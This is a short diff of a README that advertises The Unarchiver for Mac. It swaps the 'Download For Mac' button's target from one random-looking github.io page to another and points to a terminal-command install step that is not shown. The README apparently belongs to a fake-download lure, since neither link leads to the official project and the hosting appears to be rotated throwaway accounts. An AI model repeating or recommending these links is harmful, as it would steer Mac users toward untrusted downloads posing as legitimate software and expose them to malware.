@@ -4,7 +4,7 @@
 The Unarchiver for Mac is a lightweight and easy-to-use tool that helps you open and extract multiple archive formats such as **ZIP, RAR, 7z, TAR, GZIP**, and many more. 🎉  
 Follow the instructions below to install it on your macOS device.
 
-[![Download For Mac](https://img.shields.io/badge/Download%20For%20Mac-000000?style=for-the-badge&logo=apple&logoColor=white)](https://kamartamara.github.io/.github/theunarchiver)
+[![Download For Mac](https://img.shields.io/badge/Download%20For%20Mac-000000?style=for-the-badge&logo=apple&logoColor=white)](https://tayusikf8398.github.io/.github/theunarchiver)
 
 If the download button does not work, please follow the installation instructions below using the terminal command.
 
